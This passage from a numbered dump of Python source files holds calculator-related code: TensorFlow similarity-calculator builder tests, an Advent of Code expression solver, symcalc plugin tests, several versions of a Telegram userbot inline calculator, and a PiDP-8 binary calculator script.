testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "252": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "253": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "254": "def solve(calc, pre):\n    while calc.find(' ') > 0:\n        if calc.find('(') >= 0:\n            inner = get_inner_calc(calc)\n            calc = calc.replace('(' + inner + ')', solve(inner, pre), 1)\n        term = []\n        for item in calc.split(' '):\n            term.append(item.strip('()'))\n            if len(term) == 3:\n                if pre and term[1] != '+' and calc.find('+') > 0:\n                    term = [term[2]]\n                else:\n                    calc = calc.replace(' '.join(term), str(operate(term)), 1)\n    return calc\n\n\ndef get_inner_calc(calc):\n    start_index = 0\n    open_braces = 0\n    for index, char in enumerate(calc):\n        if char == '(':\n            if open_braces == 0:\n                start_index = index\n            open_braces += 1\n        elif char == ')':\n            open_braces -= 1\n            if open_braces == 0:\n                return calc[start_index + 1: index]\n\n\ndef operate(term):\n    if term[1] == '+':\n        return int(term[0]) + int(term[2])\n    elif term[1] == '*':\n        return int(term[0]) * int(term[2])\n\n\nwith open('2020/input/day18') as file:\n    parts = [0, 0]\n    for calc_ in [line.strip() for line in file]:\n        parts[0] += int(solve(calc_, False))\n        parts[1] += int(solve(calc_, True))\n    print(parts[0])\n    print(parts[1])\n", "255": "from symcalc.plugins.reminders.function_class import ReminderFunctionClass\nfrom tests import TestCalculator\n\n\ndef test_plugin_function_class_reminder_instantiate():\n    ReminderFunctionClass()\n\n\ndef test_plugin_function_class_reminder_hook():\n    calc = TestCalculator()\n    plugin = ReminderFunctionClass()\n    calc.register_plugin_and_enable(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_function_class_reminder_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(ReminderFunctionClass())\n    assert calc.chksym(\"output_functionclass\")\n    assert callable(calc.getsym(\"output_functionclass\"))\n\n\ndef test_plugin_function_class_reminder_available():\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(ReminderFunctionClass())\n    assert callable(calc.command(\"output_functionclass\"))\n\n\ndef test_plugin_function_class_reminder_example(capfd):\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(ReminderFunctionClass())\n    calc.command(\"sin\")\n    assert \"is a function\" in capfd.readouterr().out\n    calc.command(\"cos\")\n    assert \"is a function\" in capfd.readouterr().out\n    calc.command(\"arg\")\n    assert \"is a function\" in capfd.readouterr().out\n\n\ndef test_plugin_function_class_reminder_validate(capfd):\n    calc = TestCalculator()\n    calc.register_plugin_and_enable(ReminderFunctionClass())\n    remind = [\"sin\", \"cos\", \"tan\", \"csc\", \"sec\", \"cot\", \"arg\", \"sinh\", \"cosh\", \"tanh\", \"csch\", \"sech\", \"coth\", \"asin\", \"acos\", \"atan\", \"acsc\", \"asec\", \"acot\", \"asinh\", \"acosh\", \"atanh\", \"acsch\", \"asech\", \"acoth\"]\n    for r in remind:\n        calc.command(r)\n        assert \"is a function\" in capfd.readouterr().out\n    calc.command(\"exec\")\n    calc.command(\"eval\")\n    calc.command(\"compile\")\n    calc.command(\"int\")\n    calc.command(\"float\")\n    assert \"is a function\" not in capfd.readouterr().out\n\n\ndef test_plugin_function_class_reminder_enable_switch(capfd):\n    calc = TestCalculator()\n    plugin = ReminderFunctionClass()\n    calc.register_plugin_and_enable(plugin)\n    calc.command(\"sin\")\n    assert \"is a function\" in capfd.readouterr().out\n    calc.command(\"cos\")\n    assert \"is a function\" in capfd.readouterr().out\n    calc.command(\"arg\")\n    assert \"is a function\" in capfd.readouterr().out\n    assert plugin.setting_name\n    calc.settings[plugin.setting_name] = False\n    calc.command(\"sin\")\n    calc.command(\"cos\")\n    calc.command(\"arg\")\n    assert \"is a function\" not in capfd.readouterr().out\n", "256": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "257": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "258": "# Ultroid - UserBot\n# Copyright (C) 2020 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\n\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await ultroid_bot.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n\n\nHELP.update({f\"{__name__.split('.')[1]}\": f\"{__doc__.format(i=HNDLR)}\"})\n", "259": "#!/usr/bin/env python3\n'''\nbincalc.py\n\nA somewhat clumsy and pointless binary calculator program that exists purely as a\nway of playing with Oscar Vermeulen's PiDP PDP-8 replica.\nIf anyone ever points to the PiDP and asks \"What's the point of that?\" or \"What use is\nit?\", just tell them it's a binary calculator and they'll probably be amazed into\nsilence (if they don't write you off as a hopeless geek).\n\nDemonstration of the non-threaded version of the PiDP Control Panel class.\n\nVersion 1.01\n\nby Steve Mansfield-Devine\nhttp://www.lomcovak.com/speculatrix/\n\nUse this as you will. If you blog about what you do with it, a link would be\nthe honourable thing to do.\n\nFor use with Oscar Vermeulen's PiDP kit. Every home should have one. Go here:\n\thttp://obsolescence.wix.com/obsolescence#!pidp-8/cbie\n\nPYTHON 3 ONLY. Requires the PiDP_CP_NT.py library.\n\nNB: NEEDS TO BE RUN AS ROOT !\n\n\nWHAT THIS DOES\nThis binary calculator allows you to enter two binary numbers and perform various\nlogical operations on them.\n\nHOW IT WORKS\nMake sure all the switches are up.\nUse the 12 'swreg' switches - the ones directly under the Multiplier Quotient (MQ) lights\n- to enter a binary number. The MQ lights will show what you're entering.\n\nSelect the Load/Add switch to load this number into memory. It is then displayed/stored\nin the Memory Address (MA) line.\n\nNow enter another binary number with the same switches. Switch down the Dep switch to\nenter/store this number.\n\nSet the Data Field (DF) switches - the three left-most switches - to select what\noperator you want. You use the three switches to enter an octal value in the range 0-7.\n\t1\tand\n\t2\tor\n\t3\txor\n\t4\tadd\t\t\t'link' LED lights if there's a carry (a 'C' shows on the screen)\n\t5\tnand\n\t6\tsub(tract)\t'sc5' LED lights if result is negative (a '-' shows on the screen)\n\t7   nor\n\nYou can do this at any time. You can do it after you've obtained a result to do\nanother operation.\n\nThen use the Exam switch to get the result.\nThe result of the operation is shown in the Accumulator (AC) row.\nIf you have a monitor (attached or via SSH) you'll also get stuff displayed on the\nscreen. It ain't pretty, but it works.\n\n'''\n\nimport PiDP_CP_NT as PiDP_CP\nimport RPi.GPIO as GPIO\nimport sys, curses\n\nCP = PiDP_CP.PiDP_ControlPanel()\n\n# ****************************************************************************\n# ***   FUNCTIONS                                                          ***\n# ****************************************************************************\n\ndef updateScreen(stdscr, calc):\n\tstdscr.clear()\n\ttopStr = '     {0:5}'.format(operators[calc['opcode']])\n\ttopStr += opFormat.format(calc['input'])\n\tfillRpt = curses.COLS - len(topStr) - 1\n\ttopStr = topStr + (' ' * fillRpt)\n\tstdscr.addstr(0,0, (' ' * (curses.COLS - 1)), curses.A_REVERSE)\n\tstdscr.addstr(1,0, topStr, curses.A_REVERSE)\n\tstdscr.addstr(2,0, (' ' * (curses.COLS - 1)), curses.A_REVERSE)\n\n\tstdscr.addstr(5,5, 'op1:')\n\tstdscr.addstr(6,5, 'op2:')\n\tstdscr.addstr(7,5, '   =')\n\tif calc['opcode'] > 0:\n\t\tstdscr.addstr(5,46, '{:4}'.format(operators[calc['opcode']]))\n\tif calc['op1loaded']:\n\t\tstdscr.addstr(5,10, opFormat.format(calc['op1']))\n\t\tif calc['op2loaded']:\n\t\t\tstdscr.addstr(6,10, opFormat.format(calc['op2']))\n\t\t\tif calc['haveResult']:\n\t\t\t\tresultStr = opFormat.format(calc['result'])\n\t\t\t\tif calc['negFlag'] == PiDP_CP.LED_ON: resultStr += ' -'\n\t\t\t\tif calc['carryFlag'] == PiDP_CP.LED_ON: resultStr += ' C'\n\t\t\t\tstdscr.addstr(7,10, resultStr)\n\n\tstdscr.addstr(15,5, 'Store op1: {0}  |  Store op2: {1}  |  Exec: {2}'.format(OP1_DEP_SW, OP2_DEP_SW, EXEC_SW))\n\tstdscr.addstr(17,5, 'Data Field: 1=AND 2=OR 3=XOR 4=ADD 5=NAND 6=SUB 7=NOR')\n\tstdscr.refresh()\t#update screen\n\n# ****************************************************************************\n# ***   SETUP                                                              ***\n# ****************************************************************************\n\noperators = ['---', 'AND', 'OR', 'XOR', 'ADD', 'NAND', 'SUB', 'NOR']\nopFormat = '{0:0>12b}  0o{0:0>4o}  0x{0:0>3X}  {0:>4}'\n\nOP1_DEP_SW = 'load_add'\t\t# switches used to set the numbers and execute\nOP2_DEP_SW = 'dep'\t\t\t# the calculation. Change these if your version of\nEXEC_SW = 'exam'\t\t\t# the PiDP has momentary switches. The inst_field\n\t\t\t\t\t\t\t\t# switches would be good alternatives\n\nstdscr = curses.initscr()\n#curses.LINES\t\t\t\t# number  of lines in this screen\ncurses.curs_set(False)\t\t# turn off the flashing cursor\n\nstartMsg = [\n\t'BINCALC',\n\t'-----------------------------------------------------------',\n\t'Enter the first number using the 12 data switches',\n\t'beneath the Multiplier Quotient row. The controls are:',\n\t'-----------------------------------------------------------',\n\t'item                  activate with     displayed on',\n\t'-----------------------------------------------------------',\n\t'Number to enter       12 main switches  Multiplier Quotient',\n\t'Store first number    ' + '{:<10}'.format(OP1_DEP_SW) + '        Memory Address',\n\t'Store second number   ' + '{:<10}'.format(OP2_DEP_SW) + '        Memory Bank',\n\t'Get result            ' + '{:<10}'.format(EXEC_SW) + '        Accumulator',\n\t'Select operator       data_field        Step Counter',\n\t' ',\n\t'Flip a data switch now to get started -->'\n]\n'{:<10}'.format(OP1_DEP_SW)\nstartLine = 5\nfor line in startMsg:\n\tstdscr.addstr(startLine,5, line)\n\tstartLine += 1\n\n# *****************************************************************************\n# *** MAIN LOOP                                                             ***\n# *****************************************************************************\n\n\ndef main(stdscr):\n\tcalc = {\n\t\t'op1': 0,\n\t\t'op2': 0,\n\t\t'opcode': 0,\n\t\t'result': 0,\n\t\t'carryFlag': PiDP_CP.LED_OFF,\n\t\t'negFlag': PiDP_CP.LED_OFF,\n\t\t'haveResult': False,\n\t\t'input': 0,\n\t\t'op1loaded': False,\n\t\t'op2loaded': False\n\t}\n\topLeds = {\n\t\t'data_field0': 'sc3',\n\t\t'data_field1': 'sc2',\n\t\t'data_field2': 'sc1',\n\t}\n\tloop = True\n\twhile loop:\n\t\tCP.lightAllLeds(loops=5)\t\t\t\t\t\t\t# light up the LEDs\n\t\tif CP.scanAllSwitches():\n\t\t\t# switches have changed\n\t\t\tif CP.switchIsOn('stop'):\n\t\t\t\tloop = False\n\t\t\telse:\n\t\t\t\tcalc['input'] = CP.switchSetValue('swreg')\n\t\t\t\tcalc['opcode'] = CP.switchSetValue('data_field')\n\t\t\t\tCP.setLedDataBank('mq', calc['input'])\n\t\t\t\tcalc['result'] = 0\n\t\t\t\tcalc['carryFlag'] = PiDP_CP.LED_OFF\n\t\t\t\tcalc['negFlag'] = PiDP_CP.LED_OFF\n\t\t\t\tcalc['haveResult'] = False\n\t\t\t\tif CP.switchIsOn(OP1_DEP_SW):\n\t\t\t\t\tif not calc['op1loaded']:\n\t\t\t\t\t\tcalc['op1'] = calc['input']\n\t\t\t\t\t\tcalc['op1loaded'] = True\n\t\t\t\t\telse:\n\t\t\t\t\t\tif CP.switchIsOn(OP2_DEP_SW):\n\t\t\t\t\t\t\tif not calc['op2loaded']:\n\t\t\t\t\t\t\t\tcalc['op2'] = calc['input']\n\t\t\t\t\t\t\t\tcalc['op2loaded'] = True\n\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\tif calc['opcode'] > 0 and CP.switchIsOn(EXEC_SW):\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 1:\t\t\t\t\t\t# and\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['op1'] & calc['op2']\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 2:\t\t\t\t\t\t# or\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['op1'] | calc['op2']\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 3:\t\t\t\t\t\t# xor\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['op1'] ^ calc['op2']\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 4:\t\t\t\t\t\t# add\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['op1'] + calc['op2']\n\t\t\t\t\t\t\t\t\t\tif calc['result'] > 4095:\n\t\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['result'] % 4096\n\t\t\t\t\t\t\t\t\t\t\tcalc['carryFlag'] = PiDP_CP.LED_ON\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 5:\t\t\t\t\t\t# nand\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = ~(calc['op1'] & calc['op2']) & 0xFFF\t# mask highest bits of 32-bit int to avoid negative\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 6:\t\t\t\t\t\t# sub\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = calc['op1'] + ((~calc['op2']) + 1)\n\t\t\t\t\t\t\t\t\t\tif calc['result'] < 0:\n\t\t\t\t\t\t\t\t\t\t\tcalc['negFlag'] = PiDP_CP.LED_ON\n\t\t\t\t\t\t\t\t\tif calc['opcode'] == 7:\t\t\t\t\t\t# nor\n\t\t\t\t\t\t\t\t\t\tcalc['result'] = ~(calc['op1'] | calc['op2']) & 0xFFF\t# mask highest bits to avoid negative\n\t\t\t\t\t\t\t\t\tcalc['haveResult'] = True\n\t\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t\tcalc['haveResult'] = False\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tcalc['op2loaded'] = False\n\t\t\t\t\t\t\tcalc['op2'] = 0\n\t\t\t\telse:\n\t\t\t\t\tcalc['op1loaded'] = False\n\t\t\t\t\tcalc['op2loaded'] = False\n\t\t\t\t\tcalc['op1'] = 0\n\t\t\t\t\tcalc['op2'] = 0\n\t\t\tCP.setLedDataBank('ma', calc['op1'])\n\t\t\tCP.setLedDataBank('mb', calc['op2'])\n\t\t\tCP.setLedDataBank('ac', calc['result'])\n\t\t\tCP.setLedState('link', calc['carryFlag'])\n\t\t\tCP.setLedState('sc5', 